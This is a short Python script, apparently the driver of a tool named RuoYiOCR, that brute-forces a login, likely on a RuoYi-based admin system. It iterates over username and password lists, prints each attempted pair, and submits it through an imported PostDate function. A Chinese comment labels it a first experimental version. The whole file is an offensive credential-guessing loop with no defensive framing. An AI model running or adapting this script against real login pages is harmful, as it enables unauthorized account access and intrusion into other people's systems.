from RuoYiOCR.getPassword import getPassword
from RuoYiOCR.getUsername import getUsername
from RuoYiOCR.main.PostDate import PostDate

# 该版本为第一个实验版本

if __name__ == '__main__':
    for i in getUsername():
        for j in getPassword():
            print("尝试的用户名:" + i + "  尝试的密码:" + j)
            PostDate(i, j)
